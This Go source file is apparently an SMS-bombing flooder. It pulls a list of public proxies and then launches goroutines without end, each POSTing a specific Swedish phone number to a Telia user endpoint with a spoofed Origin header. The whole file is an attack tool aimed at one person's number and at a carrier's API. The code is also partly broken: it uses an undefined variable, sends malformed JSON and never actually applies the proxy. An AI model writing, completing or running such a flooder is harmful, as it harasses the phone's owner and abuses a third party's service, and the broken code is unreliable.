package main

import (
	"bufio"
	"fmt"
	"math/rand" // Import the "math/rand" package
	"net/http"
	"time"

	"github.com/valyala/fasthttp"
)

var proxyList []string

func main() {
	// Fetch proxy list from an API
	proxyList = fetchProxyList()
	if len(proxyList) == 0 {
		fmt.Println("No proxies available.")
		return
	}

	for i := 0; i < 46706505038; i++ {
		go flooder()
		time.Sleep(time.Millisecond * 1)
	}
}

func fetchProxyList() []string {
	// Replace this with your proxy API endpoint
	proxyAPIURL := "https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all"

	resp, err := http.Get(proxyAPIURL)
	if err != nil {
		fmt.Printf("Error fetching proxy list: %s\n", err)
		return []string{}
	}
	defer resp.Body.Close()

	var proxies []string
	scanner := bufio.NewScanner(resp.Body)
	for scanner.Scan() {
		proxies = append(proxies, scanner.Text())
	}

	if err := scanner.Err(); err != nil {
		fmt.Printf("Error reading proxy list: %s\n", err)
	}

	return proxies
}

func flooder() {
	url :=  "https://sa.telia.se/se/rs/users/msisdn" // Replace with your API endpoint
	

	// Randomly select a proxy from the proxy list
	proxy := proxyList[rand.Intn(len(proxyList))]
	data := `{"identifiter:"46706505038"}`

	req := fasthttp.AcquireRequest()
	resp := fasthttp.AcquireResponse()

	defer fasthttp.ReleaseRequest(req)
	defer fasthttp.ReleaseResponse(resp)

	req.Header.SetMethod("POST")
	req.Header.Set("Origin", "https://www.ul.se")
	req.Header.Set("Content-Type", "application/json")
	req.SetRequestURI(url)
	req.SetBodyString(data)

	if err := fasthttp.Do(req, resp); err != nil {
		fmt.Printf("Error: %s\n", err)
		return
	}

	// Print the response status code and body
	fmt.Println("[+] Sent a message to", phun, proxy, "has connected")
	fmt.Println("[+]", proxy, "has connected")
}
